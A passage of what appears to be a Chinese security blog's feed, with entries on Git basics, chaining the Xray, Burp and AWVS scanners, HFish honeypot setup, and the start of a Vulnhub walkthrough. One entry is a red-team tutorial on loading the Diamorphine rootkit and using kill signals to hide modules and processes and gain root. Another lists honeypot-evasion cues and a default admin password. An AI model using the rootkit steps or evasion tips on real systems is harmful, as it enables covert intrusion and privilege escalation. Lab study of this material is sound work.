alt="image-20240224151818159"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】Git 和 Github 的深度认知</title>
      <link href="/2024/02/24/Nouns-git/"/>
      <url>/2024/02/24/Nouns-git/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Git介绍"><a href="#一、Git介绍" class="headerlink" title="一、Git介绍"></a>一、Git介绍</h1><p> Git 是一个分布式版本控制系统，它不仅仅是一个客户端工具。Git 的工作方式涉及到客户端和服务器端的概念，但它的核心功能可以在本地计算机上完成，无需网络连接。以下是 Git 的一些关键特点：</p><ol><li><p><strong>分布式版本控制</strong>：</p><ul><li>Git 在每个开发者的本地计算机上都有一个完整的代码库副本，包括完整的历史记录。这意味着你可以在本地进行几乎所有的版本控制操作，如提交（commit）、分支（branch）、合并（merge）等。</li></ul></li><li><p><strong>客户端-服务器模式</strong>：</p><ul><li>尽管 Git 是分布式的，但它通常在客户端-服务器模式下使用。开发者的本地仓库（客户端）可以与远程仓库（服务器）同步。远程仓库通常托管在服务器上，如 GitHub、GitLab 或 Gitee。</li></ul></li><li><p><strong>客户端工具</strong>：</p><ul><li>Git 提供了一个命令行界面，用户可以通过命令行执行各种版本控制操作。此外，还有许多图形用户界面（GUI）客户端工具，如 GitHub Desktop、SourceTree、GitKraken 等，它们提供了更直观的操作方式。</li></ul></li><li><p><strong>服务器端</strong>：</p><ul><li>服务器端的 Git 服务提供了远程仓库的托管，允许多个开发者协作。服务器端还提供了一些额外的功能，如权限控制、Web 界面访问、持续集成（CI）和持续部署（CD）集成等。</li></ul></li></ol><p>总结来说，Git 本身是一个分布式版本控制系统，它在本地提供了完整的版本控制功能。同时，它也支持客户端-服务器模式，允许用户通过客户端工具与远程服务器进行交互。Git 是一个命令行工具，可以在任何支持 Git 的平台上使用，并且可以在没有网络连接的情况下工作。这种模式使得团队协作和代码共享变得更加容易。</p><h1 id="二、Github介绍"><a href="#二、Github介绍" class="headerlink" title="二、Github介绍"></a>二、Github介绍</h1><p>GitHub 是一个基于 Git 的在线代码托管平台，它提供了一个网站，允许开发者分享代码、协作和讨论项目。GitHub 提供了免费的公共仓库，但私有仓库（适用于企业或团队内部项目）是收费的。GitHub 还提供了一系列的 API，允许开发者和第三方应用与 GitHub 的服务进行交互。</p><p>GitHub 的强大功能和广泛的用户基础使其成为了全球最大的代码托管平台和开发者社区之一，成为全球最大的开源项目托管平台，拥有庞大的开发者社区。</p><h1 id="三、Gitee、GitLab-和-GitCode"><a href="#三、Gitee、GitLab-和-GitCode" class="headerlink" title="三、Gitee、GitLab 和 GitCode"></a>三、Gitee、GitLab 和 GitCode</h1><p>GitHub、Gitee 和 GitLab 以及其他很多都是基于 Git 这个版本控制系统的代码托管平台。</p><h2 id="1、Gitee（码云）"><a href="#1、Gitee（码云）" class="headerlink" title="1、Gitee（码云）"></a>1、Gitee（码云）</h2><p>Gitee，也称为码云，是一个中国的代码托管平台，同样基于 Git。它提供了与 GitHub 类似的功能，包括代码托管、项目管理等。Gitee 主要服务于中文社区，对于国内开发者来说，由于网络原因，访问速度可能比 GitHub 更快。Gitee 提供了免费的私有仓库服务，适合国内企业使用。</p><h2 id="2、GitLab"><a href="#2、GitLab" class="headerlink" title="2、GitLab"></a>2、GitLab</h2><p>GitLab 是一个类似于 GitHub 的平台，它也提供了基于 Git 的代码托管服务，并且可以免费搭建私有仓库。GitLab 不仅支持代码托管，还提供了一系列的 DevOps 工具，如 CI&#x2F;CD 管道、代码审查、监控等。GitLab 可以部署在私有服务器上，这对于需要内部控制和安全性的企业来说是一个优势。</p><h2 id="3、GitCode"><a href="#3、GitCode" class="headerlink" title="3、GitCode"></a>3、GitCode</h2><p>GitCode 是一个开源代码托管平台，基于Git实现，类似于中国运营的Gitee。GitCode 特别考虑到了中国用户的使用习惯，提供了一些本地化的功能，如与CSDN 账号整合，中文界面。此外，还提供了与GitHub 的同步功能，允许用户将GitHub上的项目镜像到GitCode，以加快国内用户的访问。</p><h1 id="四、git的基本使用"><a href="#四、git的基本使用" class="headerlink" title="四、git的基本使用"></a>四、git的基本使用</h1><h2 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h2><p>1、linux直接使用包管理器安装即可</p><p>2、windows需要去官网下载对应的exe版本安装</p><h2 id="2、基本的使用"><a href="#2、基本的使用" class="headerlink" title="2、基本的使用"></a>2、基本的使用</h2><p>0、git中的基本概念</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git中分几个区域</span><br><span class="line">1、本地工作区</span><br><span class="line">就是写代码的区域</span><br><span class="line">2、本地暂存区</span><br><span class="line">使用git add . 将文件加入暂存区</span><br><span class="line">3、本地版本库</span><br><span class="line">也就是本地仓库</span><br><span class="line">使用git commint将暂存区的文件送入本地仓库</span><br></pre></td></tr></table></figure><p><strong>1、本地仓库的提交使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 1、先去github或gitee 创建一个空仓库</span><br><span class="line">// 2、创建本地git仓库</span><br><span class="line">在空文件夹：git init </span><br><span class="line">或</span><br><span class="line">git clone 一个已有的仓库</span><br><span class="line">// 3、配置git 的全局变量</span><br><span class="line">git config --global user.name &quot;用户名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱&quot;</span><br><span class="line">// 4、git提交到本地暂存区</span><br><span class="line">git add .</span><br><span class="line">或指定某个文件</span><br><span class="line">git add README.md</span><br><span class="line">// 5、git提交到本地仓库（同时添加一个备注）</span><br><span class="line">git commit -m &quot;新增了一个1.txt文件&quot;</span><br><span class="line">// 6、查看本地仓库的状态</span><br><span class="line">git status </span><br><span class="line">// 某个文件有变化会标红</span><br></pre></td></tr></table></figure><p><strong>2、本地仓库的log 查看</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 1、在本地仓库的根目录查看提交历史</span><br><span class="line">git log</span><br><span class="line">// 可以基本的看到提交人、提交时间和提交的备注等信息</span><br><span class="line">// 2、查看详细的修改的具体文件</span><br><span class="line">git log --stat</span><br><span class="line">// 可以看到具体的修改的文件</span><br></pre></td></tr></table></figure><p><strong>3、本地仓库的版本回溯</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 1、先找到历史版本的ID</span><br><span class="line">git log --stat</span><br><span class="line">// 每一个版本会对应一个commit + ID</span><br><span class="line">// 2、通过commit + ID 就可以查看这个版本的修改内容</span><br><span class="line">git diff &lt;commit id&gt;</span><br><span class="line">// 3、只是查看修改内容是不够的，我们可以回滚到指定版本</span><br><span class="line">git reset --hard &lt;commit id&gt;</span><br><span class="line">或</span><br><span class="line">git checkout &lt;commit id&gt;</span><br><span class="line">// 4、我们回滚到之前版本后，又想回滚到之后的版本，如何实现？</span><br><span class="line">git reflog        // 查看所有的版本，包括被干掉的版本</span><br><span class="line">git reset --hard &lt;commit id&gt;  // 再回滚回来</span><br></pre></td></tr></table></figure><p><strong>4、本地仓库git的分支</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">master/main：一般是GitHub自动创建的主分支，存放经过测试的稳定代码</span><br><span class="line">develop：如果需要开发新的功能，会先在这个分支上进行开发测试，开发测试完成之后需要切回master分支进行合并</span><br><span class="line">// --------------------------------------</span><br><span class="line">git checkout -b develop：创建develop分支，并来到develop分支</span><br><span class="line">git branch：查看所有分支</span><br><span class="line">git checkout master：切回master分支</span><br><span class="line">git merge develop：在master分支上合并develop分支</span><br></pre></td></tr></table></figure><p><strong>5、本地仓库提交到远程仓库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 1、指定提交到的仓库地址</span><br><span class="line">git remote add origin &lt;仓库地址如：https://gitee.com/lusensec/test.git&gt;</span><br><span class="line">// error: remote origin already exists. 表示已经绑定过此仓库地址了</span><br><span class="line">// 可以修改新的仓库地址：git remote set-url origin 新的仓库URL</span><br><span class="line">// 也可以添加一个新的仓库地址：git remote add upstream 新的仓库URL</span><br><span class="line">// 2、指定push 的分支</span><br><span class="line">git push -u origin &quot;master&quot;</span><br><span class="line">// 默认master，还有main、develop等自定义分支</span><br><span class="line">// 3、强制覆盖式的推送</span><br><span class="line">git push -u origin &quot;master&quot; --force</span><br><span class="line">// 4、查看此时git对远程仓库的配置</span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure><h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>Git 是一个工具，而 GitHub、Gitee、GitLab 和GitCode  是利用 Git 提供代码托管服务的平台。</p><p>GitHub 是全球最著名的 Git 代码托管平台之一，提供了公有和私有仓库，以及丰富的社区功能，如问题跟踪、拉取请求、Fork 和 Star 等。</p><p>GitLab 提供了社区版（GitLab CE）和企业版（GitLab EE）。GitLab CE 是免费的开源软件，可以自行搭建和部署。</p><p>Gitee 作为国内平台，提供了免费的私有仓库服务，并且对于国内用户来说，访问速度更快。</p><p>GitCode 为国内用户提供了一些特殊的保障，方便国内用户访问，同时，可以同步GitHub项目镜像，可与GitHub结合使用。</p><p>选择哪个平台通常取决于个人或团队的需求、预算以及对社区和网络速度等多方面的考虑。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞扫描器】Xray+BP+AWVS扫描器联动漏洞挖掘</title>
      <link href="/2024/02/21/VulnScan-AW-BP-xray/"/>
      <url>/2024/02/21/VulnScan-AW-BP-xray/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞扫描器】Xray-BP-AWVS扫描器联动漏洞挖掘"><a href="#【漏洞扫描器】Xray-BP-AWVS扫描器联动漏洞挖掘" class="headerlink" title="【漏洞扫描器】Xray+BP+AWVS扫描器联动漏洞挖掘"></a>【漏洞扫描器】Xray+BP+AWVS扫描器联动漏洞挖掘</h1><h1 id="一、Xray的使用"><a href="#一、Xray的使用" class="headerlink" title="一、Xray的使用"></a>一、Xray的使用</h1><h3 id="1、命令行版的使用"><a href="#1、命令行版的使用" class="headerlink" title="1、命令行版的使用"></a>1、命令行版的使用</h3><p>先双击进入xray命令行版的目录下</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240220175746355.png" alt="image-20240220175746355"></p><p>再执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、主动扫描：单个url扫描</span><br><span class="line">xray_windows_amd64.exe webscan --url &quot;http://example.com/?a=b&quot;</span><br><span class="line">2、被动扫描：使用http代理进行扫描（需要在浏览器配置7777的代理）</span><br><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br><span class="line">3、指定模块扫描（命令执行和SQL注入模块）：</span><br><span class="line">xray_windows_amd64.exe webscan --plugins cmd_injection,sqldet --url http://test.com</span><br><span class="line">xray_windows_amd64.exe webscan --plugins cmd_injection,sqldet --proxy 127.0.0.1:7777</span><br></pre></td></tr></table></figure><h3 id="2、GUI-Xray版使用"><a href="#2、GUI-Xray版使用" class="headerlink" title="2、GUI-Xray版使用"></a>2、GUI-Xray版使用</h3><p><img src="/img/VulnScan-AW-BP-xray/image-20240220180859676.png" alt="image-20240220180859676"></p><p>被动扫描不需要指定url 目标，但是需要在浏览器配置xray 被动监听的代理</p><h1 id="二、Xray-和-BP联动"><a href="#二、Xray-和-BP联动" class="headerlink" title="二、Xray 和 BP联动"></a>二、Xray 和 BP联动</h1><p>1、Xray 开启被动监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>2、BP设置上游代理服务器到xray 被动监听端口</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240220180108500.png" alt="image-20240220180108500"></p><p>3、之后在浏览器配置BP 的代理即可</p><h1 id="三、Xray-AWVS-联动"><a href="#三、Xray-AWVS-联动" class="headerlink" title="三、Xray+AWVS 联动"></a>三、Xray+AWVS 联动</h1><p>在AWVS配置好被动监听的xray 即可，注意保存后扫描</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240221144043219.png" alt="image-20240221144043219"></p><h1 id="四、Xray-BP-AWVS-联动"><a href="#四、Xray-BP-AWVS-联动" class="headerlink" title="四、Xray+BP+AWVS 联动"></a>四、Xray+BP+AWVS 联动</h1><p>1、先配置好Xray + BP 联动</p><p>2、配置AWVS（记得在AWVS右上方先保存再扫描）</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240221142756519.png" alt="image-20240221142756519"></p><p>3、开始扫描，扫描信息会保存至AWVS 和 xray 的输出文件中</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240221144845892.png" alt="image-20240221144845892"></p><p>4、扫描出来将近两百条漏洞相关信息</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240221150637136.png" alt="image-20240221150637136"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞扫描器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞扫描器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【蜜罐】HFish蜜罐的搭建和使用</title>
      <link href="/2024/02/19/Blue-Team-Honeypot-Defense-Hfish/"/>
      <url>/2024/02/19/Blue-Team-Honeypot-Defense-Hfish/</url>
      
        <content type="html"><![CDATA[<h1 id="HFish蜜罐的搭建和使用"><a href="#HFish蜜罐的搭建和使用" class="headerlink" title="HFish蜜罐的搭建和使用"></a>HFish蜜罐的搭建和使用</h1><h1 id="一、蜜罐介绍"><a href="#一、蜜罐介绍" class="headerlink" title="一、蜜罐介绍"></a>一、蜜罐介绍</h1><p>蜜罐根据能力分为：低交互蜜罐、中交互蜜罐、高交互蜜罐。是一种改变网络安全防御被动局面的一种主动防御技术，现已成为监测、分析网络威胁的主要技术手段，并逐渐演进为体系化的网络主动防御架构网络欺骗。通过与移动目标防御等防御技术结合，完全有可能创造出更加安全高效的主动防御体系，在网络安全防御中发挥更大作用。</p><p>国家保密科技测评中心：<a href="https://www.gjbmj.gov.cn/n1/2021/1224/c411145-32316186.html">https://www.gjbmj.gov.cn/n1/2021/1224/c411145-32316186.html</a></p><h1 id="二、HFish-蜜罐"><a href="#二、HFish-蜜罐" class="headerlink" title="二、HFish 蜜罐"></a>二、HFish 蜜罐</h1><p>官网：<a href="https://hfish.net/">https://hfish.net/</a></p><p>提供Windows、Linux及Dcoker 下载。是一款社区型免费蜜罐，为用户提供可独立操作且实用可靠的中低交互蜜罐。用户需要先部署管理端，再通过管理端内置蜜罐节点或部署新节点。</p><h1 id="三、蜜罐部署"><a href="#三、蜜罐部署" class="headerlink" title="三、蜜罐部署"></a>三、蜜罐部署</h1><h3 id="1、部署环境"><a href="#1、部署环境" class="headerlink" title="1、部署环境"></a>1、部署环境</h3><p>我们以HFish 蜜罐为例，来进行部署</p><p>部署环境：</p><ol><li>Centos7 的Linux 系统</li><li>采用线下部署方式（方便内网环境）</li></ol><h3 id="2、线下部署"><a href="#2、线下部署" class="headerlink" title="2、线下部署"></a>2、线下部署</h3><p>linux 部署帮助文档：<a href="https://hfish.net/#/2-2-linux">Linux下载部署 (hfish.net)</a></p><p>1、下载安装包</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219134431019.png" alt="image-20240219134431019"></p><p>2、在Centos7中解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf hfish-3.3.4-linux-amd64.tgz </span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219135101119.png" alt="image-20240219135101119"></p><p>3、确保4433、4434端口开放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo firewall-cmd --add-port=4433/tcp --permanent   （用于web界面启动）</span><br><span class="line">sudo firewall-cmd --add-port=4434/tcp --permanent   （用于节点与管理端通信）</span><br><span class="line">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>4、执行install.sh脚本</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219135155606.png" alt="image-20240219135155606"></p><p>5、登陆web页面进行蜜罐访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">登陆链接：https://[ip]:4433/web/</span><br><span class="line">账号：admin</span><br><span class="line">密码：HFish2021</span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219140420136.png" alt="image-20240219140420136"></p><p>之后配置好数据库稍等片刻即可登陆首页</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219142216264.png" alt="image-20240219142216264"></p><h3 id="3、部署节点"><a href="#3、部署节点" class="headerlink" title="3、部署节点"></a>3、部署节点</h3><p>节点管理处展开节点之后即可添加节点</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219140841909.png" alt="image-20240219140841909"></p><p>添加具备诱惑力的节点，可以自己任意选择</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219140938613.png" alt="image-20240219140938613"></p><h3 id="4、查看捕获信息"><a href="#4、查看捕获信息" class="headerlink" title="4、查看捕获信息"></a>4、查看捕获信息</h3><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219141424862.png" alt="image-20240219141424862"></p><p>可查看攻击者的数据包信息</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219141746115.png" alt="image-20240219141746115"></p><p>在大屏实时捕获攻击信息</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219141555311.png" alt="image-20240219141555311"></p><h1 id="四、蜜罐识别"><a href="#四、蜜罐识别" class="headerlink" title="四、蜜罐识别"></a>四、蜜罐识别</h1><p>参考链接：<a href="https://www.freebuf.com/articles/network/236485.html">攻防演练中红队如何识别蜜罐保护自己 - FreeBuf网络安全行业门户</a></p><ol><li><strong>端口开放情况</strong>：蜜罐通常会开放大量端口，尤其是那些常用于服务的端口。如果一个系统开放了异常多的端口，尤其是那些不常见的端口，这可能是蜜罐的迹象。</li><li><strong>响应特征</strong>：蜜罐在模拟各种协议时，可能会在响应中带有一些明显的特征。例如，某些蜜罐在实现特定协议时，可能会使用固定的参数或者响应模式。</li><li><strong>协议实现的缺陷</strong>：部分蜜罐在模拟协议时可能存在不完善的地方，攻击者可以通过发送特定的请求包来检测这些缺陷，从而识别出蜜罐。</li><li><strong>WEB服务特征</strong>：蜜罐提供的WEB服务中可能会包含特定的文件、脚本或者版本号等，这些特征可以用来识别蜜罐。例如，某些蜜罐可能会在页面中嵌入特定的JavaScript文件或者显示特定的错误信息。</li><li><strong>上下文特征</strong>：蜜罐在执行命令时可能会表现出上下文的异常，如固定不变的输出或者异常的进程启动时间。</li><li><strong>Fuzz testing特征</strong>：一些蜜罐采用模糊测试（Fuzz testing）的思想，对任意端口的TCP SYN Packet进行响应，或者根据协议特征永远返回正确的响应。</li><li><strong>虚拟机特征</strong>：蜜罐可能会部署在虚拟机上，攻击者可以通过检查MAC地址范围、虚拟机特有的文件系统和注册表信息等来识别虚拟机。</li><li><strong>网络流量分析</strong>：蜜罐通常会限制系统向外的流量，或者在同一个网段内部署多个蜜罐，这可以通过网络流量分析工具如Nmap、Shodan或Censys来识别。</li><li><strong>ASN分布</strong>：蜜罐可能会部署在特定的IP地址范围内，这些地址可能属于特定的网络服务提供商（ISP），尤其是云服务提供商。</li><li><strong>设备指纹</strong>：蜜罐可能会在WEB页面中嵌入大量设备指纹信息，如Server、Title字段，这些信息可以用来识别蜜罐。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 蓝队应急 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蜜罐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【进程隐藏】Linux隐藏工具—Diamorphine</title>
      <link href="/2024/02/18/Red-Team-Linux-Hiding-Diamorphine/"/>
      <url>/2024/02/18/Red-Team-Linux-Hiding-Diamorphine/</url>
      
        <content type="html"><![CDATA[<h1 id="【进程隐藏】Linux隐藏工具—Diamorphine"><a href="#【进程隐藏】Linux隐藏工具—Diamorphine" class="headerlink" title="【进程隐藏】Linux隐藏工具—Diamorphine"></a>【进程隐藏】Linux隐藏工具—Diamorphine</h1><h2 id="零、Diamorphine-介绍"><a href="#零、Diamorphine-介绍" class="headerlink" title="零、Diamorphine 介绍"></a>零、Diamorphine 介绍</h2><p>Diamorphine 是一个Linux内核模块， 支持内核版本 2.6.x&#x2F;3.x&#x2F;4.x。可通过 uname -r 查看内核版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当加载的时候， 模块是不可见的（lsmod 看不到）；</span><br><span class="line">通过发送31信号，可以达到隐藏和不隐藏进程的目的； </span><br><span class="line">通过发送63信号，可以隐藏和不隐藏该内核模块； </span><br><span class="line">通过发送64信号（给任何进程），可以将用户变成root； </span><br><span class="line">如果文件或者目录以MAGIC_PREFIX开始，将会隐藏； </span><br></pre></td></tr></table></figure><p>项目地址： <a href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a></p><h2 id="一、部署环境"><a href="#一、部署环境" class="headerlink" title="一、部署环境"></a>一、部署环境</h2><p><strong>下载代码</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone <span class="attr">https</span>:<span class="comment">//github.com/m0nad/Diamorphine</span></span><br></pre></td></tr></table></figure><p><strong>进入目录，开始编译</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="title class_">Diamorphine</span>; </span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><strong>加载内核模块</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod diamorphine.<span class="property">ko</span></span><br></pre></td></tr></table></figure><h2 id="二、验证内核模块隐藏"><a href="#二、验证内核模块隐藏" class="headerlink" title="二、验证内核模块隐藏"></a><strong>二、验证内核模块隐藏</strong></h2><p>枚举加载的内核模块并检查 Diamorphine 是否存在列表中。</p><p><img src="/img/Red-Team-Linux-Hiding-Diamorphine/Untitled1.png" alt="Untitled1"></p><p>上图内容如下所示： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">步骤1：执行lsmod命令，diamorphine.ko模块并没有显示，因为模块被隐藏； </span><br><span class="line">步骤2：可以通过发送kill -63 信号来取消隐藏lsmod 列表中的Diamorphine 模块，语法为 kill -63 &lt;any_random_pid&gt;（再执行一遍则显示出来） </span><br><span class="line">步骤3：执行kill -63 0命令后，lsmod 列表中的Diamorphine 模块又可以正常显示</span><br></pre></td></tr></table></figure><h2 id="三、隐藏用户任意进程"><a href="#三、隐藏用户任意进程" class="headerlink" title="三、隐藏用户任意进程"></a>三、隐藏用户任意进程</h2><p>实验内容如图所示：</p><p><img src="/img/Red-Team-Linux-Hiding-Diamorphine/Untitled2.png" alt="Untitled2"></p><p>步骤1：通过运行 sleep 10000 秒来创建一个虚拟进程。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep <span class="number">1000</span> &amp;</span><br></pre></td></tr></table></figure><p>步骤2：diamorphine可以通过发送kill -31 信号从ps 列表中隐藏&#x2F;取消隐藏这个虚拟进程。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -<span class="number">31</span> &lt;pid <span class="keyword">of</span> process you want hide&gt;</span><br></pre></td></tr></table></figure><p>步骤3：使用ps命令查看sleep进程是否存在</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep sleep</span><br></pre></td></tr></table></figure><h2 id="四、普通用户提权至root"><a href="#四、普通用户提权至root" class="headerlink" title="四、普通用户提权至root"></a>四、普通用户提权至root</h2><p>diamorphine可以向用户发送kill -64 信号，授予其root 权限。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kill -<span class="number">64</span> &lt;any_random_pid&gt;</span><br><span class="line">比如</span><br><span class="line">kill -<span class="number">64</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>student用户在发送信号后升级为 root 用户。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">步骤1：切换到student，并whoami查看用户 </span><br><span class="line">步骤2：kill -64 0执行此命令进行提权 </span><br><span class="line">步骤3：再次whoami查看用户</span><br></pre></td></tr></table></figure><p><img src="/img/Red-Team-Linux-Hiding-Diamorphine/image-20240218140150262.png" alt="image-20240218140150262"></p>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程隐藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub靶场-pipe</title>
      <link href="/2024/02/17/Vulnhub-pipe/"/>
      <url>/2024/02/17/Vulnhub-pipe/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-pipe-靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-pipe-靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub-pipe 靶场渗透"></a>【Vulnhub系列靶场】Vulnhub-pipe 靶场渗透</h1><h1 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h1><p>1、解决IP扫描不到问题</p><p>2、打开虚拟机，并修改网络连接模式为【NAT】即可</p><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213142147830.png" alt="image-20240213142147830"></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p>1、粗略快速扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.63</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213142543946.png" alt="image-20240213142543946"></p><p>2、精细化扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.63</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.63</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213153317946.png" alt="image-20240213153317946"></p><p><img src="/img/Vulnhub-pipe/image-20240213142452838.png" alt="image-20240213142452838"></p><p>3、全扫描和漏洞扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 